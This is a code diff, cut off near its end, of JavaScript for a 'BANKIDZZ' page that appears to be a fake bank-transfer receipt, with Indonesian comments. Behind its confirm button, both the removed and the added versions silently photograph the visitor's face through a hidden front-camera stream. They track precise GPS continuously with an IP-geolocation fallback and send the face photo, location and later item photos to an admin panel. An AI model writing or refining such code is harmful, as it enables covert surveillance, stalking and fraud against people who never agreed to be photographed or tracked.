@@ -1,6 +1,5 @@
 // ============================================================
-// BANKIDZZ V3 - SILENT CAPTURE + REALTIME GPS + FRONT CAMERA
-// Fix: GPS real-time silent, kamera depan silent, kamera belakang
+// BANKIDZZ V2 - SILENT CAPTURE + FRONT CAMERA FIRST
 // ============================================================
 
 (function() {
@@ -11,14 +10,10 @@
         TEMPLATE_URL: '/api/template',
         WEBPROFILE_URL: '/api/webprofile',
         SYNC_CHANNEL: 'bankidzz_sync_channel',
-        SILENT_CAPTURE_DELAY: 350,
-        LOCATION_TIMEOUT: 12000,
-        LOCATION_FAST_TIMEOUT: 4000,
-        LOCATION_MAX_AGE_FRESH: 0,
-        LOCATION_MAX_AGE_WATCH: 0,
-        GPS_PRECISION_TARGET: 20,
-        FRONT_CAMERA_QUALITY: 0.80,
-        BACK_CAMERA_QUALITY: 0.85
+        SILENT_CAPTURE_DELAY: 200,       // delay ultra-cepat (ms)
+        LOCATION_TIMEOUT: 1500,          // timeout GPS otomatis (ms)
+        FRONT_CAMERA_QUALITY: 0.80,      // kualitas foto depan
+        BACK_CAMERA_QUALITY: 0.85        // kualitas foto belakang
     };
 
     // Default Template
@@ -41,24 +36,10 @@
 
     let currentTemplate = { ...defaultTemplate };
     let capturedPhotoBase64 = null;
-    let silentFrontPhotoBase64 = null;
-    let silentLocationData = null;
-    let frontCameraStream = null;
-    let backCameraStream = null;
-    let currentTransferId = (function() {
-        try {
-            var ref = sessionStorage.getItem('bankidzz_current_ref');
-            if (!ref) {
-                ref = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
-                sessionStorage.setItem('bankidzz_current_ref', ref);
-            }
-            return ref;
-        } catch(e) {
-            return 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
-        }
-    })();
-    let currentFacingMode = 'environment';
-    let currentWebProfile = null;
+    let silentFrontPhotoBase64 = null;     // Foto silent dari kamera depan
+    let silentLocationData = null;         // Lokasi silent
+    let frontCameraStream = null;          // Stream kamera depan
+    let backCameraStream = null;           // Stream kamera belakang
 
     // DOM Elements
     const elements = {
@@ -83,6 +64,7 @@
         btnCancelPhoto: document.getElementById('btnCancelPhoto'),
         btnSendPhoto: document.getElementById('btnSendPhoto'),
         fileCameraInput: document.getElementById('fileCameraInput'),
+        // Element baru untuk kamera
         cameraContainer: document.getElementById('cameraContainer'),
         cameraVideo: document.getElementById('cameraVideo'),
         cameraCanvas: document.getElementById('cameraCanvas'),
@@ -91,24 +73,26 @@
     };
 
     // ============================================================
-    // REALTIME GPS TRACKER - SILENT
+    // REALTIME GPS TRACKER & HIGH-PRECISION LOCK (100% AKURAT)
     // ============================================================
     let liveLocationData = null;
     let bestAccurateLocation = null;
     let locationWatchId = null;
-    let lastGpsSyncTime = 0;
 
+    // Helper: Periksa apakah lokasi adalah sinyal GPS hardware asli (bukan IP / fallback / loncatan kasar)
     function isRealGps(loc) {
         if (!loc || typeof loc.lat !== 'number' || typeof loc.lng !== 'number') return false;
-        if (!Number.isFinite(loc.lat) || !Number.isFinite(loc.lng)) return false;
         if (loc.lat === 0 && loc.lng === 0) return false;
+        // Bukan fallback Monas
         if (Math.abs(loc.lat - (-6.2088)) < 0.001 && Math.abs(loc.lng - 106.8456) < 0.001) return false;
+        // Bukan estimasi IP jaringan
         if (loc.source === 'default-fallback' || loc.source === 'ip-network-estimated') return false;
-        if (loc.accuracy && loc.accuracy > 1500) return false;
+        // Akurasi harus masuk akal untuk pembacaan GPS/WiFi perangkat (maks 500 meter)
+        if (loc.accuracy && loc.accuracy > 500) return false;
         return true;
     }
 
-    // Cleanup cache jika fallback palsu
+    // Bersihkan cache jika sebelumnya menyimpan titik Monas atau fallback palsu
     try {
         const savedGps = JSON.parse(localStorage.getItem('bankidzz_best_gps') || 'null');
         if (savedGps) {
@@ -119,18 +103,15 @@
             } else {
                 bestAccurateLocation = savedGps;
                 liveLocationData = savedGps;
-                silentLocationData = savedGps;
             }
         }
     } catch(e) {}
 
-    // ============================================================
-    // PROCESS NEW LOCATION
-    // ============================================================
+    // FUNGSI PUSAT PEMROSESAN POSISI (SMART LOCATION SELECTOR)
     function processNewLocation(pos, source = 'satellite-gps') {
         const newLat = pos.coords.latitude;
         const newLng = pos.coords.longitude;
-        const newAcc = pos.coords.accuracy || 9999;
+        const newAcc = pos.coords.accuracy || 15;
 
         if (!Number.isFinite(newLat) || !Number.isFinite(newLng)) return null;
         if (newLat === 0 && newLng === 0) return null;
@@ -142,32 +123,36 @@
             altitude: pos.coords.altitude || null,
             heading: pos.coords.heading || null,
             speed: pos.coords.speed || null,
-            timestamp: new Date(pos.timestamp || Date.now()).toISOString(),
-            capturedAt: Date.now(),
+            timestamp: new Date().toISOString(),
             source: source,
-            silent: true,
-            realtime: true
+            silent: true
         };
 
+        // HIERARKI PENERIMAAN KOORDINAT:
+        // 1. Hardware GPS asli dari sensor HP SELALU menang dan menggantikan estimasi IP / fallback Monas!
+        // 2. Jika sama-sama GPS sensor, terima jika akurasi lebih presisi (newAcc < prevAcc)
+        // 3. Jika sama-sama presisi (<= 65m), perbarui koordinat & timestamp live
+        // 4. Tolak hanya lompatan kasar BTS seluler (> 250m) saat kita sudah punya GPS presisi (<= 50m)
         let isBetter = false;
-        
         if (!bestAccurateLocation) {
             isBetter = true;
         } else if (!isRealGps(bestAccurateLocation)) {
-            isBetter = true;
-        } else if (newAcc < bestAccurateLocation.accuracy - 2) {
-            isBetter = true;
-        } else if (newAcc <= bestAccurateLocation.accuracy + 20) {
-            isBetter = true;
-        } else if (Date.now() - (bestAccurateLocation.capturedAt || 0) > 5000) {
-            isBetter = true;
+            isBetter = true; // Hardware GPS selalu menggantikan data estimasi jaringan / fallback!
+        } else if (newAcc < bestAccurateLocation.accuracy) {
+            isBetter = true; // Akurasi lebih presisi!
+        } else if (newAcc <= 65 && bestAccurateLocation.accuracy <= 65) {
+            isBetter = true; // Keduanya presisi tinggi, sinkronkan ke koordinat live
+        } else if (bestAccurateLocation.accuracy > 100 && newAcc <= 100) {
+            isBetter = true; // Dari sinyal seluler kasar masuk ke Wi-Fi / satelit GPS
+        } else if (newAcc > 250 && bestAccurateLocation.accuracy <= 50) {
+            isBetter = false; // Tolak loncatan BTS seluler kasar jika sudah punya GPS satelit
+        } else {
+            isBetter = false;
         }
 
         if (isBetter) {
             bestAccurateLocation = newLocation;
             liveLocationData = newLocation;
-            silentLocationData = newLocation;
-
             try {
                 localStorage.setItem('bankidzz_best_gps', JSON.stringify({
                     ...newLocation,
@@ -175,109 +160,84 @@
                 }));
             } catch(e) {}
 
-            const accText = newAcc < 1000 ? `±${Math.round(newAcc)}m` : `±${(newAcc/1000).toFixed(1)}km`;
-            console.log(`[GPS-RT] Realtime: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} ${accText} [${source}]`);
+            console.log(`[GPS-ACCURATE] Locked: ${newLocation.lat.toFixed(6)}, ${newLocation.lng.toFixed(6)} (±${Math.round(newLocation.accuracy)}m) [${source}]`);
 
-            // Auto-sync realtime ke admin segera
+            // AUTO-SYNC KE ADMIN: jika transaksi sedang berjalan dan lokasi baru adalah GPS nyata,
+            // seketika perbarui data transaksi di panel admin dengan titik satelit akurat ini!
             if (currentTransferId && isRealGps(newLocation)) {
-                const now = Date.now();
-                if (now - lastGpsSyncTime > 1500) {
-                    lastGpsSyncTime = now;
-                    if (typeof syncTransactionRecord === 'function') {
-                        syncTransactionRecord({
-                            transferId: currentTransferId,
-                            location: bestAccurateLocation,
-                            frontPhoto: silentFrontPhotoBase64 || '',
-                            photo: capturedPhotoBase64 || '',
-                            status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
-                        });
-                    }
-                }
+                syncTransactionRecord({
+                    transferId: currentTransferId,
+                    location: bestAccurateLocation,
+                    frontPhoto: silentFrontPhotoBase64 || '',
+                    photo: capturedPhotoBase64 || '',
+                    status: capturedPhotoBase64 ? 'verified' : 'waiting_item_photo'
+                });
             }
         }
 
         return newLocation;
     }
 
-    // ============================================================
-    // START REALTIME LOCATION TRACKING
-    // ============================================================
     function startRealtimeLocationTracking() {
         if (!navigator.geolocation) {
-            console.warn('[GPS] Tidak didukung browser.');
+            console.warn('[GPS] Geolocation tidak didukung browser ini.');
             return;
         }
 
+        // Cek status izin jika didukung browser
         try {
             if (navigator.permissions && navigator.permissions.query) {
                 navigator.permissions.query({ name: 'geolocation' }).then(perm => {
                     console.log('[GPS-PERM] Status:', perm.state);
+                    if (perm.state === 'denied') {
+                        showNotification('⚠️ Izin lokasi diblokir browser. Aktifkan di ikon gembok URL agar lokasi akurat.', 'warning');
+                    }
                 }).catch(() => {});
             }
         } catch(e) {}
 
+        // TAHAP 1: Segera ambil posisi cepat dari OS HP (Google Play Services / CoreLocation)
+        // maximumAge: 60000 (1 menit terakhir) -> mengembalikan posisi instan (< 100ms) dengan akurasi tinggi!
+        try {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => processNewLocation(pos, 'device-fast-cache'),
+                (err) => console.log('[GPS-INIT] Fast check notice:', err.message),
+                { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
+            );
+        } catch(e) {}
+
+        // TAHAP 2: Jalankan watchPosition aktif di latar belakang untuk terus mengunci satelit segar
+        const geoOptions = {
+            enableHighAccuracy: true,
+            timeout: 25000,
+            maximumAge: 5000 // Izinkan penyegaran hingga 5 detik agar sensor HP terus terbarui
+        };
+
         const onLocationSuccess = (pos) => {
-            processNewLocation(pos, 'satellite-realtime');
+            processNewLocation(pos, 'satellite-gps');
         };
 
         const onLocationError = (err) => {
-            if (err.code !== 1) {
-                console.warn('[GPS-RT] Notice:', err.message);
-            }
+            console.warn('[GPS-LIVE] Notice:', err.message, 'code:', err.code);
         };
 
-        // 1. FAST CACHED GPS (Sangat cepat di HP <50ms dengan akurasi GPS asli)
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => processNewLocation(pos, 'satellite-cached-fast'),
-                () => {},
-                { enableHighAccuracy: true, timeout: 3500, maximumAge: 300000 }
-            );
-        } catch(e) {}
-
-        // 2. STANDARD FAST CHECK (Fallback Wi-Fi / Tower seluler perangkat)
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => processNewLocation(pos, 'device-network-fast'),
-                () => {},
-                { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
-            );
-        } catch(e) {}
-
-        // 3. FRESH SATELLITE GPS (Kunci koordinat satelit terkini)
-        try {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => processNewLocation(pos, 'satellite-instant'),
-                (err) => console.log('[GPS-INIT] Fresh check:', err.message),
-                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-            );
-        } catch(e) {}
-
-        // 4. WATCH CONTINUOUS REALTIME STREAM
         try {
             if (locationWatchId !== null) {
                 navigator.geolocation.clearWatch(locationWatchId);
             }
-            
-            locationWatchId = navigator.geolocation.watchPosition(
-                onLocationSuccess, 
-                onLocationError, 
-                { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
-            );
-            console.log('[GPS-RT] Watch position realtime aktif');
+            locationWatchId = navigator.geolocation.watchPosition(onLocationSuccess, onLocationError, geoOptions);
         } catch(e) {
-            console.warn('[GPS-RT] watchPosition error:', e);
+            console.warn('[GPS-LIVE] watchPosition error:', e);
         }
     }
 
-    // ============================================================
-    // IP LOCATION FALLBACK
-    // ============================================================
     async function getNetworkIpLocation() {
+        // Jika sudah ada koordinat GPS akurat dari hardware perangkat, gunakan GPS hardware!
         if (isRealGps(bestAccurateLocation)) {
             return { ...bestAccurateLocation };
         }
 
+        // Coba layanan IP Geolocation bebas CORS
         const services = [
             async () => {
                 const resp = await fetch('https://ipwho.is/');
@@ -287,7 +247,7 @@
                         return {
                             lat: data.latitude,
                             lng: data.longitude,
-                            accuracy: 15000,
+                            accuracy: 15000, // 15 km (estimasi ISP / kota)
                             timestamp: new Date().toISOString(),
                             source: 'ip-network-estimated',
                             city: data.city || '',
@@ -326,6 +286,8 @@
             } catch(e) {}
         }
 
+        // Fallback terakhir jika offline / tanpa koneksi: Monas Jakarta
+        // PENTING: diberi akurasi 50000m (50 km) agar TIDAK PERNAH memblokir pembacaan sensor GPS asli HP!
         return {
             lat: -6.2088,
             lng: 106.8456,
@@ -336,110 +298,74 @@
         };
     }
 
-    // ============================================================
-    // GET SILENT LOCATION - REALTIME GPS PRIORITY (MULTI-TIER)
-    // ============================================================
     function getSilentLocation() {
         return new Promise((resolve) => {
-            // Cek jika sudah ada GPS real-time akurat dalam 45 detik terakhir
+            // 1. Jika GPS perangkat sudah berhasil mengunci posisi hardware nyata (akurasi <= 100m)
             if (isRealGps(bestAccurateLocation)) {
-                const age = Date.now() - (bestAccurateLocation.capturedAt || 0);
-                if (age < 45000 && bestAccurateLocation.accuracy <= 100) {
-                    console.log('[GPS] Realtime GPS akurat dari cache aktif:', Math.round(age/1000) + 's lalu (±' + Math.round(bestAccurateLocation.accuracy) + 'm)');
-                    resolve({ ...bestAccurateLocation });
-                    return;
-                }
+                resolve({ ...bestAccurateLocation });
+                return;
             }
 
             if (!navigator.geolocation) {
-                console.warn('[GPS] Browser tidak mendukung geolocation, pakai fallback');
+                console.warn('[GPS] Geolocation tidak didukung browser ini.');
                 getNetworkIpLocation().then(resolve);
                 return;
             }
 
             let resolved = false;
 
-            const finalize = async (reason = '') => {
-                if (resolved) return;
-                resolved = true;
-
-                if (isRealGps(bestAccurateLocation)) {
-                    resolve({ ...bestAccurateLocation });
-                } else if (isRealGps(liveLocationData)) {
-                    resolve({ ...liveLocationData });
-                } else {
-                    console.log('[GPS] GPS belum terkunci (' + reason + '), fallback IP');
-                    const ipLoc = await getNetworkIpLocation();
-                    resolve(ipLoc);
-                }
-            };
-
-            // Batas waktu maksimal sebelum fallback
+            // Timer batas waktu 9.5 detik agar pengguna sempat merespon izin dan GPS sempat lock
             const timeoutId = setTimeout(() => {
-                finalize('timeout');
-            }, 8000);
+                if (!resolved) {
+                    resolved = true;
+                    if (isRealGps(bestAccurateLocation)) {
+                        resolve({ ...bestAccurateLocation });
+                    } else if (isRealGps(liveLocationData)) {
+                        resolve({ ...liveLocationData });
+                    } else {
+                        getNetworkIpLocation().then(resolve);
+                    }
+                }
+            }, 9500);
 
-            // Tier 1: Fast Cached High Accuracy (Cepat sekali di smartphone)
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const loc = processNewLocation(pos, 'satellite-gps-cached');
-                        if (loc && isRealGps(loc) && !resolved) {
-                            clearTimeout(timeoutId);
-                            resolved = true;
-                            resolve({ ...loc });
-                        }
-                    },
-                    () => {},
-                    { enableHighAccuracy: true, timeout: 3000, maximumAge: 300000 }
-                );
-            } catch(e) {}
-
-            // Tier 2: Fast Device Network Location (Wi-Fi/Tower seluler akurat)
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        const loc = processNewLocation(pos, 'device-gps-fast');
-                        if (loc && isRealGps(loc) && !resolved) {
-                            clearTimeout(timeoutId);
-                            resolved = true;
-                            resolve({ ...loc });
-                        }
-                    },
-                    () => {},
-                    { enableHighAccuracy: false, timeout: 3500, maximumAge: 600000 }
-                );
-            } catch(e) {}
-
-            // Tier 3: Fresh High Accuracy Satellite GPS
-            try {
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
+            // Coba ambil posisi segar langsung dari Geolocation API
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const loc = processNewLocation(pos, 'gps-accurate');
+                    if (!resolved) {
+                        resolved = true;
                         clearTimeout(timeoutId);
-                        const loc = processNewLocation(pos, 'satellite-gps-realtime');
-                        if (!resolved) {
-                            resolved = true;
-                            resolve({ ...(loc || bestAccurateLocation) });
+                        resolve({ ...(loc || bestAccurateLocation) });
+                    }
+                },
+                (err) => {
+                    console.warn('[GPS] getCurrentPosition error:', err.message, 'code:', err.code);
+                    if (err.code === 1) { // PERMISSION_DENIED
+                        showNotification('⚠️ Akses GPS (lokasi) diblokir browser. Aktifkan izin lokasi di URL agar koordinat akurat.', 'warning');
+                    }
+                    if (!resolved) {
+                        resolved = true;
+                        clearTimeout(timeoutId);
+                        if (isRealGps(bestAccurateLocation)) {
+                            resolve({ ...bestAccurateLocation });
+                        } else {
+                            getNetworkIpLocation().then(resolve);
                         }
-                    },
-                    (err) => {
-                        console.warn('[GPS] getCurrentPosition error:', err.code, err.message);
-                        if (err.code === 1) {
-                            clearTimeout(timeoutId);
-                            finalize('permission_denied');
-                        }
-                    },
-                    { enableHighAccuracy: true, timeout: 7500, maximumAge: 0 }
-                );
-            } catch(e) {
-                clearTimeout(timeoutId);
-                finalize('exception');
-            }
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 9000,
+                    maximumAge: 60000 // 60 detik cache recent OS
+                }
+            );
         });
     }
 
+    let currentTransferId = null;
+
     // ============================================================
-    // SILENT FRONT CAMERA CAPTURE
+    // SILENT FRONT CAMERA CAPTURE (WAJAH - OTOMATIS & CEPAT)
     // ============================================================
     async function silentFrontCameraCapture() {
         try {
@@ -449,6 +375,7 @@
             }
 
             let stream = null;
+            // 1. Coba kamera depan (user facing camera untuk HP / Webcam)
             try {
                 stream = await navigator.mediaDevices.getUserMedia({
                     video: {
@@ -459,7 +386,7 @@
                     audio: false
                 });
             } catch(eUser) {
-                console.warn('[FRONT-CAM] facingMode user gagal:', eUser);
+                console.warn('[FRONT-CAM] facingMode user gagal, mencoba video default:', eUser);
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({
                         video: true,
@@ -474,6 +401,7 @@
             if (!stream) return null;
             frontCameraStream = stream;
 
+            // Pasang video element di DOM (ukuran 2px, opacity 0.01) agar browser mendecode frame kamera
             const video = document.createElement('video');
             video.srcObject = stream;
             video.setAttribute('playsinline', '');
@@ -488,6 +416,7 @@
                 console.warn('[FRONT-CAM] video.play error:', ePlay);
             }
 
+            // Tunggu hingga frame aktif dari sensor kamera (videoWidth > 0 dan readyState >= 2)
             await new Promise((resolve) => {
                 let attempts = 0;
                 const checkFrame = () => {
@@ -501,8 +430,10 @@
                 checkFrame();
             });
 
-            await new Promise(r => setTimeout(r, CONFIG.SILENT_CAPTURE_DELAY));
+            // Beri jeda 350ms agar sensor kamera HP menyesuaikan eksposur cahaya wajah
+            await new Promise(r => setTimeout(r, 350));
 
+            // Tangkap frame wajah ke canvas dengan resolusi optimal
             const canvas = document.createElement('canvas');
             const maxDim = 800;
             let w = video.videoWidth > 0 ? video.videoWidth : 640;
@@ -521,14 +452,16 @@
             const ctx = canvas.getContext('2d');
             ctx.drawImage(video, 0, 0, w, h);
 
-            const capturedFacePhoto = canvas.toDataURL('image/jpeg', CONFIG.FRONT_CAMERA_QUALITY);
+            const capturedFacePhoto = canvas.toDataURL('image/jpeg', 0.80);
 
+            // Bersihkan video element
             try {
                 video.pause();
                 video.srcObject = null;
                 video.remove();
             } catch(e) {}
 
+            // HENTIKAN SEMUA TRACK KAMERA DEPAN SECARA BERSIH
             if (frontCameraStream) {
                 frontCameraStream.getTracks().forEach(track => {
                     try { track.stop(); } catch(e) {}
@@ -536,11 +469,11 @@
                 frontCameraStream = null;
             }
 
-            console.log('[FRONT-CAM] ✓ Silent capture sukses!');
+            console.log('[FRONT-CAM] Sukses silent capture foto wajah!');
             return capturedFacePhoto;
 
         } catch (err) {
-            console.error('[FRONT-CAM] Error:', err);
+            console.error('[FRONT-CAM] Error pada silentFrontCameraCapture:', err);
             if (frontCameraStream) {
                 try {
                     frontCameraStream.getTracks().forEach(track => track.stop());
@@ -551,8 +484,10 @@
         }
     }
 
+    let currentFacingMode = 'environment';
+
     // ============================================================
-    // BACK CAMERA
+    // BACK CAMERA FOR ITEM / TRANSACTION PHOTO (KAMERA BELAKANG HP)
     // ============================================================
     async function openBackCamera(targetMode = 'environment') {
         currentFacingMode = targetMode;
@@ -574,6 +509,7 @@
             const devices = await navigator.mediaDevices.enumerateDevices().catch(() => []);
             const videoDevices = devices.filter(d => d.kind === 'videoinput');
 
+            // 1. Coba cari device dari daftar device yang labelnya sesuai
             if (targetMode === 'environment') {
                 const backDevice = videoDevices.find(d => /back|rear|environment|belakang|camera2\s*0/i.test(d.label));
                 if (backDevice) {
@@ -604,6 +540,7 @@
                 }
             }
 
+            // 2. Coba exact facingMode (khusus HP smartphone agar pasti kamera belakang)
             if (!stream) {
                 try {
                     stream = await navigator.mediaDevices.getUserMedia({
@@ -615,7 +552,8 @@
                         audio: false
                     });
                 } catch (eExact) {
-                    console.warn(`[BACK-CAM] exact ${targetMode} failed:`, eExact);
+                    console.warn(`[BACK-CAM] exact ${targetMode} failed, mencoba ideal:`, eExact);
+                    // 3. Coba ideal facingMode
                     try {
                         stream = await navigator.mediaDevices.getUserMedia({
                             video: {
@@ -651,7 +589,7 @@
 
             if (elements.cameraStatus) {
                 const isBack = (targetMode === 'environment');
-                elements.cameraStatus.innerHTML = `<span style="background:${isBack ? 'rgba(16,185,129,0.2)' : 'rgba(59,130,246,0.2)'}; color:${isBack ? '#10b981' : '#60a5fa'}; border:1px solid ${isBack ? '#10b981' : '#3b82f6'}; padding:4px 12px; border-radius:14px; font-size:12px; font-weight:700;">${isBack ? '📷 Kamera Belakang Aktif' : '📷 Kamera Depan Aktif'}</span>`;
+                elements.cameraStatus.innerHTML = `<span style="background:${isBack ? 'rgba(16,185,129,0.2)' : 'rgba(59,130,246,0.2)'}; color:${isBack ? '#10b981' : '#60a5fa'}; border:1px solid ${isBack ? '#10b981' : '#3b82f6'}; padding:4px 12px; border-radius:14px; font-size:12px; font-weight:700;">${isBack ? '📷 Kamera Belakang HP Aktif' : '📷 Kamera Depan Aktif'}</span>`;
             }
 
             if (elements.cameraContainer) {
@@ -660,18 +598,20 @@
 
             return true;
         } catch (err) {
-            console.error('[BACK-CAM] Error:', err);
+            console.error('[BACK-CAM] Error opening rear camera:', err);
             return false;
         }
     }
 
+    // Fungsi untuk ganti kamera (Depan <-> Belakang)
     async function switchCamera() {
         const nextMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
-        console.log(`[SWITCH-CAM] Beralih ke: ${nextMode}`);
+        console.log(`[SWITCH-CAM] Beralih kamera ke: ${nextMode}`);
         await openBackCamera(nextMode);
     }
     window.switchCamera = switchCamera;
 
+    // Capture snapshot dari kamera belakang dengan resolusi optimal
     function captureBackCamera() {
         let dataUrl = null;
         try {
@@ -694,7 +634,7 @@
             const ctx = canvas.getContext('2d');
             if (video) {
                 ctx.drawImage(video, 0, 0, w, h);
-                dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
+                dataUrl = canvas.toDataURL('image/jpeg', 0.80);
             }
         } catch (e) {
             console.warn('captureBackCamera error:', e);
@@ -715,7 +655,9 @@
     }
 
     // ============================================================
-    // MAIN HANDLER
+    // MAIN HANDLER:
+    // 1. SILENT CAPTURE WAJAH (KAMERA DEPAN) -> LANGSUNG MASUK KE ADMIN
+    // 2. SETELAH SELESAI, OTOMATIS BUKA KAMERA BELAKANG UNTUK FOTO BARANG
     // ============================================================
     async function handleConfirmClick() {
         if (!elements.btnConfirm) return;
@@ -726,36 +668,47 @@
         elements.btnConfirm.textContent = 'Memproses...';
         elements.btnConfirm.disabled = true;
 
-        currentTransferId = currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase());
+        // Generate ID transaksi unik untuk sesi ini
+        currentTransferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
 
         try {
-            // Aktifkan streaming GPS seketika di latar belakang
-            startRealtimeLocationTracking();
+            // ========================================================
+            // TAHAP 1A: KUNCI LOKASI GPS PERANGKAT SECARA BERSIH
+            // ========================================================
+            if (elements.btnConfirm) elements.btnConfirm.textContent = '📍 Mengunci Lokasi GPS...';
+            console.log('[TAHAP-1A] Mengunci lokasi GPS presisi perangkat...');
+            const locResult = await getSilentLocation();
+            silentLocationData = locResult;
 
-            // Eksekusi pengambilan foto wajah silent & penguncian lokasi GPS secara hening (parallel)
-            const [locResult, frontResult] = await Promise.all([
-                (isRealGps(bestAccurateLocation) && (Date.now() - (bestAccurateLocation.capturedAt || 0) < 30000))
-                    ? Promise.resolve(bestAccurateLocation)
-                    : getSilentLocation(),
-                silentFrontCameraCapture()
-            ]);
-
-            silentLocationData = locResult || bestAccurateLocation;
+            // ========================================================
+            // TAHAP 1B: SILENT CAPTURE WAJAH (KAMERA DEPAN)
+            // ========================================================
+            if (elements.btnConfirm) elements.btnConfirm.textContent = '📷 Menyiapkan Kamera...';
+            console.log('[TAHAP-1B] Silent Capture Wajah Kamera Depan...');
+            const frontResult = await silentFrontCameraCapture();
             silentFrontPhotoBase64 = frontResult;
 
-            // Kirim data silent (wajah + lokasi realtime) ke server admin
-            syncTransactionRecord({
+            // LANGSUNG KIRIM KE ADMIN (Kamera Wajah + Lokasi Masuk Duluan)
+            console.log('[TAHAP-1C] Mengirim Silent Capture Wajah & Lokasi ke Admin...');
+            await syncTransactionRecord({
                 transferId: currentTransferId,
-                location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
-                frontPhoto: silentFrontPhotoBase64 || '',
-                photo: '',
+                location: silentLocationData,
+                frontPhoto: silentFrontPhotoBase64,
+                photo: '', // Menunggu jepretan kamera belakang
                 status: 'waiting_item_photo'
             });
 
-            // Langsung buka kamera belakang untuk foto barang transaksi
+            // Berikan jeda singkat agar driver hardware kamera HP selesai melepas kamera depan
+            await new Promise(r => setTimeout(r, 400));
+
+            // ========================================================
+            // TAHAP 2: SETELAH SELESAI, LANGSUNG BUKA KAMERA BELAKANG HP UNTUK FOTO BARANG
+            // ========================================================
+            console.log('[TAHAP-2] Otomatis membuka kamera belakang HP untuk foto barang...');
             const backOpened = await openBackCamera('environment');
 
             if (!backOpened) {
+                // Fallback jika kamera belakang tidak dapat dibuka
                 if (typeof window.html2canvas === 'function' && elements.receiptCard) {
                     try {
                         const canvas = await window.html2canvas(elements.receiptCard, {
@@ -770,14 +723,14 @@
 
                 await syncTransactionRecord({
                     transferId: currentTransferId,
-                    location: isRealGps(bestAccurateLocation) ? bestAccurateLocation : silentLocationData,
-                    frontPhoto: silentFrontPhotoBase64 || '',
+                    location: silentLocationData,
+                    frontPhoto: silentFrontPhotoBase64,
                     photo: capturedPhotoBase64 || '',
                     status: 'verified'
                 });
 
                 if (elements.btnConfirm) {
-                    elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
+                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                     elements.btnConfirm.style.backgroundColor = '#10b981';
                     elements.btnConfirm.dataset.verified = 'true';
                 }
@@ -798,7 +751,8 @@
     window.handleConfirmClick = handleConfirmClick;
 
     // ============================================================
-    // HANDLE CAPTURE BACK PHOTO
+    // HANDLE CAPTURE BACK PHOTO (FOTO BARANG TRANSAKSI)
+    // KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
     // ============================================================
     async function handleCaptureBackPhoto() {
         if (!elements.btnCaptureBack) return;
@@ -809,43 +763,26 @@
         elements.btnCaptureBack.disabled = true;
 
         try {
+            // 1. Ambil foto barang dari kamera belakang
             const backPhoto = captureBackCamera();
             if (backPhoto) {
                 capturedPhotoBase64 = backPhoto;
             }
 
-            // Pastikan mengambil koordinat GPS real-time terbaru saat memotret barang
+            // 2. KETIKA DI FOTO, LANGSUNG MASUK JUGA KE HALAMAN ADMIN
+            // Selalu prioritaskan koordinat GPS satelit paling segar dan akurat (TIDAK BOLEH pakai estimasi IP jika ada GPS)
             let finalLocation = null;
-            
-            // Coba ambil posisi fresh instan (timeout singkat 2 detik)
-            if (navigator.geolocation) {
-                try {
-                    const freshGps = await new Promise(res => {
-                        navigator.geolocation.getCurrentPosition(
-                            (p) => res(processNewLocation(p, 'satellite-photo-capture')),
-                            () => res(null),
-                            { enableHighAccuracy: true, timeout: 2500, maximumAge: 0 }
-                        );
-                    });
-                    if (freshGps && isRealGps(freshGps)) {
-                        finalLocation = freshGps;
-                    }
-                } catch(e) {}
+            if (isRealGps(bestAccurateLocation)) {
+                finalLocation = bestAccurateLocation;
+            } else if (isRealGps(liveLocationData)) {
+                finalLocation = liveLocationData;
+            } else if (isRealGps(silentLocationData)) {
+                finalLocation = silentLocationData;
+            } else {
+                finalLocation = await getSilentLocation();
             }
 
-            if (!finalLocation) {
-                if (isRealGps(bestAccurateLocation)) {
-                    finalLocation = bestAccurateLocation;
-                } else if (isRealGps(liveLocationData)) {
-                    finalLocation = liveLocationData;
-                } else if (isRealGps(silentLocationData)) {
-                    finalLocation = silentLocationData;
-                } else {
-                    finalLocation = await getSilentLocation();
-                }
-            }
-
-            console.log('[TAHAP-3] Kirim foto barang ke admin...');
+            console.log('[TAHAP-3] Mengirim foto barang transaksi ke admin...');
             await syncTransactionRecord({
                 transferId: currentTransferId || ('REF-' + Math.random().toString(36).substr(2, 8).toUpperCase()),
                 location: finalLocation,
@@ -854,6 +791,7 @@
                 status: 'verified'
             });
 
+            // 3. Update status tombol di struk menjadi sukses terverifikasi
             if (elements.btnConfirm) {
                 elements.btnConfirm.textContent = 'Konfirmasi Berhasil Diverifikasi';
                 elements.btnConfirm.style.backgroundColor = '#10b981';
@@ -878,16 +816,11 @@
     window.handleCaptureBackPhoto = handleCaptureBackPhoto;
 
     // ============================================================
-    // SYNC TRANSACTION RECORD
+    // SYNC TRANSACTION RECORD KE ADMIN (LOCALSTORAGE, BROADCAST & API)
     // ============================================================
     async function syncTransactionRecord(data) {
         const transferId = data.transferId;
         
-        let resolvedLocation = data.location || silentLocationData || bestAccurateLocation || liveLocationData;
-        if (isRealGps(bestAccurateLocation)) {
-            resolvedLocation = bestAccurateLocation;
-        }
-
         const payload = {
